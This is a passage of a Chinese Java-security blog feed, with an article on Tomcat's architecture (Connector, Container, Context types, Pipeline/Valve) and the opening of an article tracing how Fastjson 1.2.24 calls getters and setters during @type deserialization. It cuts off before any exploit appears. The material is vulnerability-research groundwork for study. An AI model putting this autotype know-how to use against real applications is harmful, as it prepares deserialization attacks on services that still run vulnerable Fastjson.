    <summary type="html">&lt;h2 id=&quot;Servlet-动态注册机制&quot;&gt;&lt;a href=&quot;#Servlet-动态注册机制&quot; class=&quot;headerlink&quot; title=&quot;Servlet 动态注册机制&quot;&gt;&lt;/a&gt;Servlet 动态注册机制&lt;/h2&gt;&lt;p&gt;Servlet API 提供了动态注册机制，</summary>
      
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>基础篇 - Tomcat 架构</title>
    <link href="https://changeyourway.github.io/2024/09/26/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-Tomcat%E6%9E%B6%E6%9E%84/"/>
    <id>https://changeyourway.github.io/2024/09/26/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-Tomcat%E6%9E%B6%E6%9E%84/</id>
    <published>2024-09-26T07:28:22.567Z</published>
    <updated>2024-09-26T07:59:53.396Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Tomcat-介绍"><a href="#Tomcat-介绍" class="headerlink" title="Tomcat 介绍"></a>Tomcat 介绍</h2><p>Tomcat 是 Apache 软件基金会开发的一个开源 Java Servlet 容器，用于运行 Java Web 应用程序。它实现了多个 Java EE 规范，如 Servlet、JSP（Java Server Pages）和 WebSocket 等，主要用于处理动态网页请求。作为一个轻量级的应用服务器，Tomcat 常用于开发和测试环境中，同时也适用于生产环境中的中小型应用。</p><h2 id="Tomcat-架构"><a href="#Tomcat-架构" class="headerlink" title="Tomcat 架构"></a>Tomcat 架构</h2><p>在 Tomcat Server 中，核心架构主要由三个组件组成：<strong>Service</strong>、<strong>Connector</strong> 和 <strong>Container</strong>。它们共同构成了 Tomcat 的请求处理和应用管理机制。</p><img src="/images/Tomcat-2.png"><p>以下是对这三个组件的介绍：</p><h4 id="Service-服务"><a href="#Service-服务" class="headerlink" title="Service (服务)"></a>Service (服务)</h4><ul><li><strong>功能</strong>：<code>Service</code> 是 Tomcat 中用于组织和管理多个 <code>Connector</code> 和一个 <code>Container</code> 的组件。它负责协调客户端连接和容器之间的关系。</li><li><strong>结构</strong>：一个 <code>Service</code> 包含一个 <code>Container</code>（通常是 <code>Engine</code>）和多个 <code>Connector</code>。<code>Service</code> 的目的是在多个客户端请求和后端的 Web 应用之间建立桥梁。</li><li><strong>工作机制</strong>：当请求通过 <code>Connector</code> 接入时，<code>Service</code> 会负责将这些请求分发给 <code>Container</code> 处理。<code>Service</code> 也是多个连接器共享一个 <code>Container</code> 的桥梁。</li></ul><h4 id="Connector-连接器"><a href="#Connector-连接器" class="headerlink" title="Connector (连接器)"></a>Connector (连接器)</h4><ul><li><strong>功能</strong>：<code>Connector</code> 负责处理客户端和 Tomcat 服务器之间的通信。它将客户端的请求转换成 Tomcat 可以理解的请求对象，并将响应返回给客户端。</li><li><strong>协议支持</strong>：Connector 支持多种协议，如 HTTP、HTTPS 和 AJP 。常见的连接器包括：<ul><li><strong>HTTP Connector</strong>：用于处理标准的 HTTP 请求。</li><li><strong>AJP Connector</strong>：用于在 Tomcat 和其他 Web 服务器（如 Apache HTTP Server）之间使用 AJP 协议进行通信。</li></ul></li><li><strong>工作机制</strong>：<code>Connector</code> 接受客户端的网络连接请求，然后将这些请求传递给 <code>Service</code> 中的 <code>Container</code> 进行进一步处理。</li></ul><h4 id="Container-容器"><a href="#Container-容器" class="headerlink" title="Container (容器)"></a>Container (容器)</h4><ul><li><strong>功能</strong>：<code>Container</code> 是 Tomcat 中用于处理请求的核心组件。它负责解析和处理通过 <code>Connector</code> 接收到的请求，并生成相应的响应。</li><li><strong>层级结构</strong>：Container 包含四种子容器（Engine、Host、Context 和 Wrapper）：<ul><li><strong>Engine</strong>：最顶层的容器，表示整个 Servlet 引擎。它负责处理通过 <code>Connector</code> 接收到的所有请求。一个 Tomcat 实例通常只包含一个 <code>Engine</code>，它在接受请求后将其分发到相应的 <code>Host</code>。</li><li><strong>Host</strong>：表示一个虚拟主机。一个 <code>Host</code> 代表一个能够承载多个应用的虚拟主机，通常与一个域名相对应。它允许 Tomcat 在同一台服务器上支持多个域名（虚拟主机）。</li><li><strong>Context</strong>：代表单个 Web 应用，管理该应用的生命周期。所有的 Servlet、过滤器、监听器等都运行在 <code>Context</code> 中。</li><li><strong>Wrapper</strong>：包装一个具体的 Servlet，处理最终的请求。</li></ul></li></ul><img src="/images/20220217164552.png"><ul><li><strong>工作机制</strong>：当 <code>Container</code> 接收到 <code>Connector</code> 传递的请求时，它会逐级解析请求，最终将请求交给正确的 <code>Servlet</code> 进行处理。</li></ul><h2 id="Tomcat-Context"><a href="#Tomcat-Context" class="headerlink" title="Tomcat Context"></a>Tomcat Context</h2><p>Tomcat 中有三种 Context ：ServletContext、StandardContext、ApplicationContext </p><h4 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h4><ul><li>接口：<code>ServletContext</code> 是一个接口，提供了访问和管理 web 应用程序共享资源的能力。它为所有 servlets 提供全局的视图。</li><li>获取方式：通过 <code>request.getServletContext()</code> 可以获取到 <code>ApplicationContextFacade</code> 对象，它是 <code>ServletContext</code> 的一个实现类的包装器，用于保护实际的 <code>ServletContext</code> 实现不被直接操作。</li><li>共享性：<code>ServletContext</code> 是在 web 容器启动时为每个 web 应用创建的，它在应用的生命周期内有效，并且在同一应用的所有 servlets 之间共享。因此，它代表当前 web 应用，可以访问应用的资源和设置。</li></ul><h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><ul><li>实现类：<code>ApplicationContext</code> 是 <code>ServletContext</code> 接口的一个具体实现类。在 Tomcat 中，<code>ApplicationContext</code> 被封装在 <code>ApplicationContextFacade</code> 中，主要用于提供对 <code>ServletContext</code> 的安全访问。</li><li>功能：<code>ApplicationContext</code> 实现了 <code>ServletContext</code> 中的方法，因此，它可以管理 web 应用的全局资源、配置初始化参数以及共享属性。</li><li>作用：实际上，<code>ApplicationContext</code> 是对 <code>StandardContext</code> 的进一步封装，<code>ApplicationContext</code> 中的方法会调用 <code>StandardContext</code> 中的对应方法，形成对 web 应用的实际管理。</li></ul><h4 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h4><ul><li>核心实现：<code>StandardContext</code> 是 Tomcat 中 <code>org.apache.catalina.Context</code> 接口的默认实现类。它表示一个完整的 web 应用，并且是 Tomcat 用于管理应用生命周期、配置、加载和运行的实际 <code>Context</code> 实现。</li><li>功能与作用：<ul><li>负责管理整个 web 应用的生命周期（启动、停止、重载等）。</li><li>管理应用的所有 servlets、filters、listeners 等组件。</li><li>提供对应用的资源路径、JNDI 资源、会话管理等功能的支持。</li></ul></li><li>关系：<code>StandardContext</code> 是 Tomcat 内部的核心组件，负责实现 <code>Context</code> 接口的所有功能，并为 <code>ApplicationContext</code> 提供实际的支持。<code>ApplicationContext</code> 调用的很多方法最终都会映射到 <code>StandardContext</code> 的实现中。</li></ul><h2 id="Tomcat-管道机制"><a href="#Tomcat-管道机制" class="headerlink" title="Tomcat 管道机制"></a>Tomcat 管道机制</h2><p><strong>Tomcat 管道机制（Pipeline Mechanism）</strong> 是 Tomcat 内部的请求处理模型之一，它提供了一种灵活的、可扩展的处理请求和响应的方式。管道机制允许在请求和响应处理过程中插入多个可配置的处理器（Valve），这些处理器按顺序执行，形成一个请求处理的链条。</p><h4 id="Pipeline-和-Valve-的关系"><a href="#Pipeline-和-Valve-的关系" class="headerlink" title="Pipeline 和 Valve 的关系"></a>Pipeline 和 Valve 的关系</h4><p>在 Tomcat 中，<strong>Pipeline（管道）</strong> 是容器（如 <code>Engine</code>、<code>Host</code>、<code>Context</code> 等）的一个组件，用来组织多个 <strong>Valve（阀门）</strong>。Valve 是一个个的请求处理器，而 Pipeline 负责管理这些 Valve 的顺序调用。</p><p>Tomcat 中，管道就像一个请求处理的通道，而 Valve 是放在管道中的处理站。每个请求进入 Tomcat 时，会沿着这个管道依次经过各个 Valve，直到最终处理完成。</p><ul><li><strong>Pipeline</strong>：是一个容器，它维护一系列的 Valve，形成一个处理链。</li><li><strong>Valve</strong>：是管道中的节点，执行特定的请求处理逻辑。</li></ul><h4 id="Pipeline-结构"><a href="#Pipeline-结构" class="headerlink" title="Pipeline 结构"></a>Pipeline 结构</h4><p>Tomcat 的 Pipeline 由以下两部分组成：</p><ul><li><strong>基本 Valve</strong>（Basic Valve）：每个管道都必须有一个基本 Valve，它是管道中最后一个被调用的 Valve，负责实际的请求处理（如转发请求给某个特定的 Servlet）。如果没有其他的自定义 Valve 进行拦截或修改，最终的请求会由基本 Valve 处理。</li><li><strong>普通 Valve</strong>：可以在基本 Valve 之前插入多个普通的 Valve，这些 Valve 按照配置的顺序依次执行。</li></ul><img src="/images/20220218104446-17273329294125.png"><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>当请求进入 Tomcat 时，经过容器（如 <code>Engine</code>、<code>Host</code>、<code>Context</code> 等）的 Pipeline，Pipeline 中的 Valve 会按顺序执行，处理请求并决定是否传递给下一个 Valve。如果某个 Valve 拦截了请求并处理完成，可能会终止后续 Valve 的调用。</p><p><strong>执行过程</strong>：</p><ol><li>请求进入某个容器的 Pipeline。</li><li>Pipeline 从第一个 Valve 开始，依次调用每个 Valve 的 <code>invoke()</code> 方法。</li><li>每个 Valve 处理请求并决定是否传递给下一个 Valve。如果需要传递，调用 <code>getNext().invoke(request, response)</code>。</li><li>如果没有下一个 Valve，最终由 Basic Valve 处理请求。</li></ol><p>Tomcat 每个层级的容器（Engine、Host、Context、Wrapper），都有基础的 Valve 实现（StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve），他们同时维护了一个 Pipeline 实例（StandardPipeline），也就是说，我们可以在任何层级的容器上针对请求处理进行扩展。这四个 Valve 的基础实现都继承了 ValveBase。这个类帮我们实现了生命接口及 MBean 接口，使我们只需专注阀门的逻辑处理即可。</p><p><strong>参考文章</strong> </p><p><a href="https://myzxcg.com/2021/10/Tomcat-%E6%9E%B6%E6%9E%84%E4%B8%8EContext%E5%88%86%E6%9E%90/#%E4%B8%89%E7%A7%8Dcontext%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB">Tomcat 架构与 Context 分析</a></p><p><a href="https://goodapple.top/archives/1359">Java 安全学习 —— Tomcat 架构浅析</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Tomcat-介绍&quot;&gt;&lt;a href=&quot;#Tomcat-介绍&quot; class=&quot;headerlink&quot; title=&quot;Tomcat 介绍&quot;&gt;&lt;/a&gt;Tomcat 介绍&lt;/h2&gt;&lt;p&gt;Tomcat 是 Apache 软件基金会开发的一个开源 Java Servlet </summary>
      
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>漏洞篇 - Fastjson 反序列化</title>
    <link href="https://changeyourway.github.io/2024/09/18/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://changeyourway.github.io/2024/09/18/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-09-18T02:22:44.238Z</published>
    <updated>2024-09-18T02:40:13.518Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Fastjson-介绍"><a href="#Fastjson-介绍" class="headerlink" title="Fastjson 介绍"></a>Fastjson 介绍</h2><p>Fastjson 是阿里巴巴开发的一个高性能 JSON 解析库，广泛应用于 Java 项目中。它的主要功能是对 JSON 数据进行序列化和反序列化，即将 Java 对象转换为 JSON 字符串，或者将 JSON 字符串解析为 Java 对象。Fastjson 的优势在于其速度和灵活性，特别是在处理大规模数据时性能表现良好。</p><h4 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h4><p>导入如下依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">     &lt;dependency&gt;</span><br><span class="line">          &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">          &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">          &lt;version&gt;1.2.24&lt;/version&gt;</span><br><span class="line">     &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>在 pojo 包下创建一个简单类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">package pojo;</span><br><span class="line"></span><br><span class="line">public class User &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int id;</span><br><span class="line"></span><br><span class="line">    public User()&#123;</span><br><span class="line">        System.out.println(&quot;无参构造&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public User(String name, int id) &#123;</span><br><span class="line">        System.out.println(&quot;有参构造&quot;);</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;User&#123;&quot; +</span><br><span class="line">                &quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +</span><br><span class="line">                &quot;, id=&quot; + id +</span><br><span class="line">                &#x27;&#125;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        System.out.print(&quot;getName&quot;);</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        System.out.println(&quot;setName&quot;);</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getId() &#123;</span><br><span class="line">        System.out.println(&quot;getId&quot;);</span><br><span class="line">        return id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setId(int id) &#123;</span><br><span class="line">        System.out.println(&quot;setId&quot;);</span><br><span class="line">        this.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h6><p>调用 JSON 的 toJSONString 方法将对象转换为字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import pojo.User;</span><br><span class="line"></span><br><span class="line">public class base &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        User user = new User(&quot;zhangsan&quot;,1);</span><br><span class="line">        String json = JSON.toJSONString(user);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果如下：</p><img src="/images/image-20240908181155911.png"><p>可以看出，在调用 JSON.toJSONString 方法时调用了对象的 getter 方法获取属性值。</p><p>toJSONString 方法有很多重写：</p><img src="/images/image-20240908182025834.png"><p>在 Java 中，方法参数后面的三个点（…）代表可变参数（Varargs），即这个方法可以接受任意数量的该类型参数。在 Fastjson 中，SerializerFeature… features 意味着这个方法可以接受多个 SerializerFeature 枚举值，甚至可以不传递任何 SerializerFeature。</p><p>如果再多传入一个参数 SerializerFeature ，值为 SerializerFeature.WriteClassName ，就可以在序列化结果中多打印一个 <code>@type：类名 </code>：</p><img src="/images/image-20240908182419256.png"><p>传入 SerializerFeature.WriteClassName 可以使得 Fastjson 支持自省，开启自省后序列化成 JSON 的数据就会多一个 @type ，这个是代表对象类型的 JSON 文本。</p><h6 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h6><p>反序列化时常使用的方法为 parse() 、parseObject() 、parseArray() ，这三个方法也均包含若干重载方法：</p><img src="/images/image-20240908183842566.png"><p>下面程序用来测试反序列化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import pojo.User;</span><br><span class="line"></span><br><span class="line">public class base2 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String json = &quot;&#123;\&quot;@type\&quot;:\&quot;pojo.User\&quot;,\&quot;id\&quot;:1,\&quot;name\&quot;:\&quot;zhangsan\&quot;&#125;&quot;;</span><br><span class="line">        String json2 = &quot;&#123;\&quot;id\&quot;:1,\&quot;name\&quot;:\&quot;zhangsan\&quot;&#125;&quot;;</span><br><span class="line">        System.out.println(JSON.parseObject(json));</span><br><span class="line">        System.out.println(&quot;----------------------------------&quot;);</span><br><span class="line">        System.out.println(JSON.parseObject(json2));</span><br><span class="line">        System.out.println(&quot;----------------------------------&quot;);</span><br><span class="line">        System.out.println(JSON.parseObject(json, User.class));</span><br><span class="line">        System.out.println(&quot;----------------------------------&quot;);</span><br><span class="line">        System.out.println(JSON.parseObject(json2, User.class));</span><br><span class="line">        System.out.println(&quot;----------------------------------&quot;);</span><br><span class="line">        System.out.println(JSON.parse(json));</span><br><span class="line">        System.out.println(&quot;----------------------------------&quot;);</span><br><span class="line">        System.out.println(JSON.parse(json2));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果如下：</p><img src="/images/image-20240908184736798.png"><p>不同的方法和参数得到的结果也不同，其中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JSON.parseObject(json2)</span><br><span class="line">JSON.parse(json2)</span><br></pre></td></tr></table></figure><p>这两个方式的反序列化是失败的。</p><h6 id="parse-、parseObject"><a href="#parse-、parseObject" class="headerlink" title="parse() 、parseObject()"></a>parse() 、parseObject()</h6><p>来聊聊这两个方法。在上面的案例中可以知道，如果要成功反序列化出 User 对象，parseObject 就一定要指定第二个参数为 User.class ，而 parse 则一定要用 @type 指定要反序列化的类。</p><p>parseObject 方法如果不指定第二个参数，那么会返回 JSONObject 对象，而不是 User 对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JSON.parseObject(json)</span><br></pre></td></tr></table></figure><img src="/images/image-20240909201051828.png"><p>并且像这样的调用方式会同时调用 User 的 getter&#x2F;setter 方法。</p><h4 id="getter-setter-方法的调用"><a href="#getter-setter-方法的调用" class="headerlink" title="getter&#x2F;setter 方法的调用"></a>getter&#x2F;setter 方法的调用</h4><p>可以发现，无论是序列化还是反序列化，都会调用其 getter 或 setter 方法。我们来跟进一下看看具体是在哪里调用的。</p><p>就以 <code>JSON.parseObject(json)</code> 这样的调用方式为例，跟进 JSON#parseObject(String)：</p><img src="/images/image-20240909202110606.png"><p>这里调用 parse 方法，跟进 JSON#parse(String)：</p><img src="/images/image-20240909202301936.png"><p>继续跟进 JSON#parse(String, int)：</p><img src="/images/image-20240909202358542.png"><p>这里先是调用 DefaultJSONParser 获取一个默认 Json 解析器，然后调用解析器的 parse 方法。</p><p>跟进 DefaultJSONParser#parse()：</p><img src="/images/image-20240909202729863.png"><p>跟进 DefaultJSONParser#parse(Object)：</p><img src="/images/image-20240909202826828.png"><p>直接进入了 case LBRACE 。JSONObject 的构造方法没什么可看的。</p><p>直接跟进 DefaultJSONParser#parseObject(final Map, Object)：</p><img src="/images/image-20240909203543875.png"><p>方法的中间调用了 config.getDeserializer 来获取一个反序列化器，我们先跟进它，也就是 ParserConfig#getDeserializer(Type)：</p><img src="/images/image-20240909204441243.png"><p>这里调用重载方法，跟进 ParserConfig#getDeserializer(Class&lt;?&gt;, Type)：</p><img src="/images/image-20240909205354076.png"><p>跟进 ParserConfig#createJavaBeanDeserializer(Class&lt;?&gt;, Type) ：</p><img src="/images/image-20240909205522033.png"><p>跟进 JavaBeanInfo#build(Class&lt;?&gt;, Type, PropertyNamingStrategy)：</p><img src="/images/image-20240909210324655.png"><p>这个方法比较重要，那些 getter&#x2F;setter 方法就是在这里获取名称的。</p><p>在方法的中间遍历类中的所有 public 方法，过滤出符合条件的 setter 方法：</p><img src="/images/image-20240909215418147.png"><p>代码很长，这里就不放完了。总结起来就是：</p><p><strong>判断 setter 方法：</strong></p><ol><li>方法名长度大于等于 4</li><li>不是静态方法</li><li>返回类型为空或当前类</li><li>参数个数为 1 个</li><li>方法上的 @JSONField 注解没有指定该字段不可反序列化</li><li>方法名以 “set” 开头</li></ol><p><strong>判断字段名：</strong></p><p><code>char c3 = methodName.charAt(3);</code> 获取方法名的第四个字符（即 setXyz 中的 X）</p><ul><li>如果 c3 是大写字母，则字段名为 setXyz 中的 xyz 。</li><li>如果 c3 是下划线 _ ，则字段名为 set_xxx 中的 xxx 。</li><li>如果方法名的第五个字符是大写字符，则保留原来的大写风格。比如 setURL 保留 URL 作为字段名。</li><li>根据上述方法推导出来的字段名，通过反射去查找类中的实际字段。如果没有找到字段，并且方法参数是 <code>boolean</code> 类型，尝试将字段名前面加个 “is” ，改为 isXyz 形式重新查找字段。</li></ul><p>后面再接着遍历类中的所有 public 方法，过滤出符合条件的 getter 方法：</p><img src="/images/image-20240912125238245.png"><p><strong>同样总结一下获取 getter 方法的规则：</strong></p><ul><li>方法名长于 4</li><li>不是静态方法</li><li>以 get 开头且第 4 位是大写字母</li><li>没有参数</li><li>返回类型继承自 Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong </li><li>对带有 @JSONField 注解的方法，优先使用注解中定义的属性名或选项。</li></ul><p>build 方法的最后将该类的构造函数、字段、获取到的 setter&#x2F;getter 方法以及其他与序列化和反序列化相关的信息都封装进了一个 JavaBeanInfo 对象：</p><img src="/images/image-20240909210450000.png"><p>好的，回到 DefaultJSONParser#parseObject(final Map, Object) ，我们接下来看下面的调用：</p><img src="/images/image-20240909222558930.png"><p>跟进 JavaBeanDeserializer#deserialze(DefaultJSONParser, Type, Object)：</p><img src="/images/image-20240909222829590.png"><p>这里需要注意的是，如果直接进入下一步，会跟不进去：</p><img src="/images/image-20240909222955341.png"><p>这是由于 ParserConfig#createJavaBeanDeserializer(Class&lt;?&gt;, Type) 中设置 asmEnable 为 true 了。如果确实想跟进去看的话，可以在调试时将其值设置为 false 。asmEnable 是 true 的情况下，使用 asm 从字节码层面生成特定 javabean 的反序列化器，自然无法跟进去看了；为 false 的时候，则使用常规的 set 方法进行反序列化（效率低、不安全）。不过这两种方法生成的内容是一样的。</p><p>那么重新调试，再次调试到这里的时候，将其值设置为 false ：</p><img src="/images/image-20240909224200706.png"><p>继续调试到 JavaBeanDeserializer#deserialze(DefaultJSONParser, Type, Object)，此时可以跟进了：</p><img src="/images/image-20240909224746559.png"><p>这里两个重载方法，一路跟到 JavaBeanDeserializer#deserialze(DefaultJSONParser, Type, Object, Object, int)：</p><img src="/images/image-20240909230114277.png"><p>这个方法在经过一系列处理后，最终调用到了 fieldDeser.setValue 来为 User 对象赋值。</p><p>跟进 FieldDeserializer#setValue(Object, Object)：</p><img src="/images/image-20240909230613785.png"><p>这里就是最终调用 setter 方法的地方。</p><p>然而，如果说 json 字符串中的字段名与 JavaBeanInfo#build(Class&lt;?&gt;, Type, PropertyNamingStrategy) 方法获取到的 JavaBeanInfo 对象中存储的字段名不一致的话，那么 JavaBeanDeserializer#deserialze(DefaultJSONParser, Type, Object, Object, int) 的 matchField 值为 false ，就会进入另一条分支，调用 parseField 方法来处理。比如我现在将 id 字段改为 <code>_i_d_</code> ，但是 setter 方法还是叫 setId ：</p><img src="/images/image-20240910113902176.png"><p>跟进 JavaBeanDeserializer#parseField(DefaultJSONParser, String, Object, Type, Map&lt;String, Object&gt;)：</p><img src="/images/image-20240910161435223.png"><p>跟进 JavaBeanDeserializer#smartMatch(String)，这是一个比较关键的方法，如果匹配不一致的话，会判断 key 是否是 is 开头，或者将 key 中的 - 和 _ 去掉再比对：</p><img src="/images/image-20240910161832985.png"><p>也就是说即使字段名为 <code>_i_d_</code> ，依然能够找到名为 setId 的 setter 方法。</p><p>若是走这条路，则是在 DefaultFieldDeserializer#parseField(DefaultJSONParser, Object, Type, Map&lt;String, Object&gt;) 中调用 setvalue 方法：</p><img src="/images/image-20240910170924261.png"><img src="/images/image-20240910171423585.png"><p>那么 getter 方法又在哪里调用呢？回到最初的 JSON#parseObject(String)：</p><img src="/images/image-20240909230901546.png"><p>现在 parse 这条路已经走完了，跟进 JSON#toJSON(Object)，这是一个将 Java 对象转为 Json 数据的方法：</p><img src="/images/image-20240909231153735.png"><p>跟进 JSON#toJSON(Object, SerializeConfig) ：</p><img src="/images/image-20240909231640434.png"><p>这里调用 javaBeanSerializer.getFieldValuesMap 来获取字段值的 Map 集合。</p><p>跟进 JavaBeanSerializer#getFieldValuesMap(Object)：</p><img src="/images/image-20240909231809051.png"><p>这里调用 getter.getPropertyValue 获取属性值。</p><p>跟进 FieldSerializer#getPropertyValue(Object) ：</p><img src="/images/image-20240909231942642.png"><p>跟进 FieldInfo#get(Object)：</p><img src="/images/image-20240909232056519.png"><p>这里就是调用 getter 方法的地方了。</p><h4 id="调用链总结"><a href="#调用链总结" class="headerlink" title="调用链总结"></a>调用链总结</h4><p>于是可以总结出如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">JSON#parseObject(String)</span><br><span class="line">*-&gt; JSON#parse(String)</span><br><span class="line">*   JSON#parse(String, int)</span><br><span class="line">*   DefaultJSONParser#parse()</span><br><span class="line">*   DefaultJSONParser#parse(Object)</span><br><span class="line">*   DefaultJSONParser#parseObject(final Map, Object)</span><br><span class="line">*   *-&gt; ParserConfig#getDeserializer(Type)</span><br><span class="line">*   *   ParserConfig#getDeserializer(Class&lt;?&gt;, Type)</span><br><span class="line">*   *   ParserConfig#createJavaBeanDeserializer(Class&lt;?&gt;, Type) # 设置 asmEnable 为 false</span><br><span class="line">*   *   JavaBeanInfo#build(Class&lt;?&gt;, Type, PropertyNamingStrategy) # 筛选 setter/getter 方法</span><br><span class="line">*   *-&gt; JavaBeanDeserializer#deserialze(DefaultJSONParser, Type, Object)</span><br><span class="line">*   *   JavaBeanDeserializer#deserialze(DefaultJSONParser, Type, Object, int)</span><br><span class="line">*   *   JavaBeanDeserializer#deserialze(DefaultJSONParser, Type, Object, Object, int)</span><br><span class="line">*   *   *-&gt; JavaBeanDeserializer#parseField(DefaultJSONParser, String, Object, Type, Map&lt;String, Object&gt;)</span><br><span class="line">*   *   *   *-&gt; JavaBeanDeserializer#smartMatch(String) # 字段名不一致，去除-_等符号再比对</span><br><span class="line">*   *   *   *-&gt; DefaultFieldDeserializer#parseField(DefaultJSONParser, Object, Type, Map&lt;String, Object&gt;)</span><br><span class="line">*   *   *   *   FieldDeserializer#setValue(Object, Object) # 调用 setter/getter 方法</span><br><span class="line">*   *   *-&gt; FieldDeserializer#setValue(Object, Object) # 调用 setter/getter 方法</span><br><span class="line">*-&gt; JSON#toJSON(Object)</span><br><span class="line">*   JSON#toJSON(Object, SerializeConfig)</span><br><span class="line">*   JavaBeanSerializer#getFieldValuesMap(Object)</span><br><span class="line">*   